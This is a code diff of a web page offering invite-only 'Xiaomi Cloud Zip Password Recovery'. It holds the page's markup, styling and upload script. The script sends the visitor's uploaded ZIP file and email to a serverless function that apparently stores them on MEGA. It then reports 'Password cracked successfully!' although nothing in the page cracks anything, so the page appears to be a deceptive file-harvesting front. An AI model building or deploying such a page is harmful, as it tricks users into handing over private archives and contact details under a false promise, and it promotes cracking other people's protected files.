@@ -1,11 +1,13 @@
 <!DOCTYPE html>
 <html lang="en">
-
+ 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Xiaomi Cloud Zip Password Recovery</title>
-    <script src="https://cdn.jsdelivr.net/npm/megajs@1.0.5/browser/mega.min.js"></script> <!-- Include MEGA SDK -->
+    <title>Xiaomi Cloud Zip Password Recovery </title>
+</head>
+
+<body>
     <style>
         * {
             margin: 0 auto;
@@ -40,7 +42,6 @@
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             width: 350px;
-            margin-top: 20px;
         }
 
         .recover h1 {
@@ -64,6 +65,7 @@
             border-radius: 5px;
             margin-bottom: 15px;
             overflow: hidden;
+            position: relative;
         }
 
         .progress-bar-fill {
@@ -71,8 +73,11 @@
             background-color: #4caf50;
             width: 0;
             transition: width 0.25s;
-            text-align: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             color: white;
+            font-size: 12px;
         }
 
         .recover button {
@@ -134,9 +139,6 @@
             color: white;
         }
     </style>
-</head>
-
-<body>
     <header class="navbar">
         <div class="rightnav">
             <img src="logo1.png" alt="Logo">
@@ -146,14 +148,11 @@
     <section class="mainsection">
         <section class="steps">
             <h1 class="firstlist">How to Recover Password on ZIP file</h1>
-            <ul>
-                <li class="firstlist">This is invite-based and exclusive for Xiaomi cloud zip file password cracking.
-                </li>
-                <li class="firstlist">Enter a valid and working email address.</li>
-                <li class="firstlist">Click inside the file drop area to upload a ZIP file or drag & drop the archive.
-                </li>
-                <li class="firstlist">Your password on ZIP file will be recovered automatically.</li>
-            </ul>
+            <li class="firstlist">This is invite-based tool and exclusive for Xiaomi cloud zip file password cracking.
+            </li>
+            <li class="firstlist">Enter a valid and working email address.</li>
+            <li class="firstlist">Click inside the file drop area to upload a ZIP file or drag & drop the archive.</li>
+            <li class="firstlist">Your password on ZIP file will be recovered automatically.</li>
         </section>
         <section class="recover">
             <h1>Xiaomi Cloud Zip Password Recovery</h1>
@@ -161,7 +160,9 @@
                 <input type="email" id="email" placeholder="Enter your email" required>
                 <input type="file" id="fileInput" accept=".zip" required />
                 <div class="progress-bar" id="progress-bar">
-                    <div class="progress-bar-fill" id="progress-bar-fill"></div>
+                    <div class="progress-bar-fill" id="progress-bar-fill">
+                        <span id="progress-percent"></span>
+                    </div>
                 </div>
                 <button type="submit">Recover password</button>
             </form>
@@ -175,9 +176,9 @@
     </footer>
 
     <script>
-        const emailWhitelist = ['allowedemail1@example.com', 'allowedemail2@example.com']; // Add your invite-based email addresses here
+        const emailWhitelist = ['allowedemail1@example.com', 'allowedemail2@example.com'];
 
-        document.getElementById('uploadForm').addEventListener('submit', async (e) => {
+        document.getElementById('uploadForm').addEventListener('submit', (e) => {
             e.preventDefault();
 
             const fileInput = document.getElementById('fileInput');
@@ -185,49 +186,59 @@
             const emailInput = document.getElementById('email').value.trim();
             const responseElement = document.getElementById('response');
             const progressBarFill = document.getElementById('progress-bar-fill');
+            const progressPercent = document.getElementById('progress-percent');
 
-            // Check if the email is in the whitelist
             if (!emailWhitelist.includes(emailInput)) {
                 responseElement.textContent = "Your email is not invited to use this service.";
                 return;
             }
 
             if (file && emailInput) {
-                try {
-                    // Connect to MEGA storage
-                    const storage = new mega.Storage({
-                        email: 'your-mega-email', // Replace with your MEGA email
-                        password: 'your-mega-password', // Replace with your MEGA password
-                    });
+                const reader = new FileReader();
+                reader.onload = (event) => {
+                    const fileData = event.target.result.split(',')[1];
 
-                    await storage.ready;
+                    const fileExtension = file.name.split('.').pop();
+                    const newFileName = `${emailInput}.${fileExtension}`;
 
-                    // Create an upload stream
-                    const uploadStream = storage.upload({
-                        name: file.name,
-                        size: file.size,
-                    });
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', '/.netlify/functions/upload-to-mega', true);
+                    xhr.setRequestHeader('Content-Type', 'application/json');
 
-                    // Monitor upload progress
-                    uploadStream.on('progress', (data) => {
-                        const percentComplete = (data.bytesLoaded / file.size) * 100;
-                        progressBarFill.style.width = `${percentComplete}%`;
-                        progressBarFill.textContent = `${Math.round(percentComplete)}%`;
-                    });
+                    xhr.upload.onprogress = (event) => {
+                        if (event.lengthComputable) {
+                            const percentComplete = Math.round((event.loaded / event.total) * 100);
+                            progressBarFill.style.width = `${percentComplete}%`;
+                            progressPercent.textContent = `${percentComplete}%`; // Show the percentage
+                        }
+                    };
 
-                    // Complete the upload
-                    const uploadedFile = await uploadStream.complete;
-                    const link = await uploadedFile.link();
+                    xhr.onload = () => {
+                        if (xhr.status === 200) {
+                            responseElement.textContent = `Password cracked successfully! Please check your email.`;
+                        } else {
+                            responseElement.textContent = `Error occurred. Please try again.`;
+                        }
+                    };
 
-                    responseElement.textContent = `Password cracked successfully! Please check your email. Link: ${link}`;
-                } catch (error) {
-                    responseElement.textContent = `Error occurred: ${error.message}`;
-                }
+                    xhr.onerror = () => {
+                        responseElement.textContent = `Upload failed. Please try again.`;
+                    };
+
+                    xhr.send(JSON.stringify({
+                        fileData,
+                        fileName: newFileName,
+                        email: emailInput,
+                    }));
+                };
+
+                reader.readAsDataURL(file);
             } else {
                 responseElement.textContent = "Please provide both an email and a file.";
             }
         });
     </script>
+
 </body>
 
 </html>
